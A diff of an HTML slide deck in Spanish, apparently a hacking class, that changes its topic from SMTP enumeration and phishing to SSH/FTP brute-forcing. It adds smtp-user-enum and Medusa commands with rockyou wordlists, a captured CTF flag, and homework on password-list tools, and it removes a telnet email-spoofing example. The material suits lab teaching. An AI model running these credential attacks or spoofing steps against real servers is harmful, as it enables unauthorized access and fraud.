@@ -62,36 +62,11 @@
 <!-- PORTADA -->
 <section>
     <h3> Hackeando el Correo</h3>
-    <p>SMTP · Enumeración · Phishing</p>
+    <p>SSH · FTP · Brute Force Attack</p>
     <p><b>Juan Fajardo</b></p>
 </section>
 
 <!-- INTRO -->
-<section>
-<section>
-    <h2>1. ¿Cómo funciona el correo electrónico?</h2>
-    <div class="tip">
-        El correo electrónico se basa en servidores que envían, reciben y almacenan mensajes.
-    </div>
-    <ul>
-        <li>MUA: Cliente (Outlook, Gmail)</li>
-        <li>MTA: Servidor SMTP</li>
-        <li>MDA: Entrega final</li>
-    </ul>
-</section>
-
-<section>
-    <h3>Flujo del correo</h3>
-    <ul>
-        <li>Usuario envía correo</li>
-        <li>Servidor SMTP lo procesa</li>
-        <li>Consulta DNS (MX)</li>
-        <li>Entrega al servidor destino</li>
-    </ul>
-</section>
-</section>
-
-<!-- PROTOCOLOS -->
 <section>
 <section>
     <h2>2. Protocolos de correo</h2>
@@ -102,10 +77,7 @@
         <tr><td>IMAP</td><td>Gestión</td><td>143 / 993</td></tr>
     </table>
 </section>
-</section>
 
-<!-- DNS -->
-<section>
 <section>
     <h2>3. Identificación de servidor de correo</h2>
 
@@ -136,22 +108,6 @@
         <li>Identifica versión del servicio</li>
     </ul>
 </section>
-</section>
-
-<!-- RIESGOS -->
-<section>
-<section>
-    <h2>5. Riesgos en SMTP</h2>
-    <ul>
-        <li>Enumeración de usuarios</li>
-        <li>Phishing</li>
-        <li>Open Relay</li>
-    </ul>
-</section>
-</section>
-
-<!-- ENUM -->
-<section>
 <section>
     <h2>6. Enumeración de usuarios</h2>
 
@@ -160,6 +116,7 @@
             $ telnet IP 25
             $ HELO dominio.com
             $ VRFY usuario
+            $ smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlist/unix_users.txt -t 192.168.1.1
         </pre>
     </div>
 </section>
@@ -167,35 +124,79 @@
 
 
 <section>
-<section>
-    <h2>7. Phishing</h2>
-    <img src="correo2.png" alt=""/>
-</section>
-
 
 <section>
-    <h2>7. Phishing</h2>
+    <h2>Ataque Fuerza Bruta</h2>
     <img src="correo1.png" alt=""/>
 </section>
 
 <section>
-    <h2>7. Envío de correos (Phishing)</h2>
+    <h2>7. Introducción a SSH y FTP</h2>
+    <p>
+        <strong>SSH (Secure Shell):</strong> Es un protocolo de red seguro que permite administrar y acceder de forma remota a servidores a través de un canal cifrado. Corre habitualmente en el <strong>puerto 22</strong> (TCP).<br>
+        <strong>FTP (File Transfer Protocol):</strong> Es un protocolo estándar utilizado para la transferencia de archivos entre un cliente y un servidor en una red. Corre habitualmente en los <strong>puertos 20 y 21</strong> (TCP).
+    </p>
+</section>
 
+<section>
+    <h2>8. Fundamentos de Ataques a Contraseñas</h2>
+    <p>
+        Los ataques a credenciales buscan obtener acceso no autorizado mediante el descubrimiento de contraseñas.
+    </p>
+</section>
+<section>
+    <ul>
+        <li><strong>Ataque de Diccionario:</strong> Utiliza una lista  de palabras o contraseñas comunes (wordlists).</li>
+        <li><strong>Ataque de Fuerza Bruta:</strong> Genera y prueba exhaustivamente todas las combinaciones posibles de caracteres (letras, números, símbolos)</li>
+        <li><strong>Rainbow Tables:</strong> Es una técnica basada en tablas de consulta con valores hash precalculados. </li>
+    </ul>
+</section>
+
+<section>
+    <h2>9. Uso de Medusa para Autenticación Forzada</h2>
+    <p>
+        <strong>Medusa</strong> es una herramienta de prueba de penetración en paralelo, rápida y modular, diseñada para realizar ataques de fuerza bruta contra diversos servicios de red (SSH, FTP, HTTP, SMB, entre otros).
+    </p>
+</section><section>
+
+    <h3>Ataque de fuerza bruta a SSH con Medusa</h3>
     <div class="command-box">
         <pre>
-        $ telnet IP 25
-        $ HELO test.com
-        $ MAIL FROM: atacante@test.com
-        RCPT TO: victima@empresa.com
-        DATA
-        Subject: Prueba
-
-        Mensaje falso
-        .
-        $ QUIT
+$ medusa -h 192.168.1.1 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh
+        </pre>
+    </div>
+</section><section>
+    <h3>Ataque de fuerza bruta a FTP con Medusa</h3>
+    <div class="command-box">
+        <pre>
+            $ medusa -h 192.168.1.1 -U /usr/share/wordlists/users.txt -P /usr/share/wordlists/rockyou.txt -M ftp
         </pre>
     </div>
 </section>
+
+<section>
+    <h2>10. Bandera Encontrada</h2>
+    <p>Contenido obtenido del archivo <code>flag.txt</code> tras el acceso exitoso:</p>
+    <div class="command-box">
+        <pre>
+            $ cat /root/flag.txt
+            FLAG{m3dus4_ssh_ftp_brut3_f0rc3_succ3ss}
+        </pre>
+    </div>
+</section>
+
+<section>
+    <h2> Tarea</h2>
+    Averigue que es el uso :
+    <pre>
+    - cupp.py
+    - Cewl 
+    - crunch
+    - rockyou
+    </pre>
+</section>
+
+
 </section>
 
 </div>
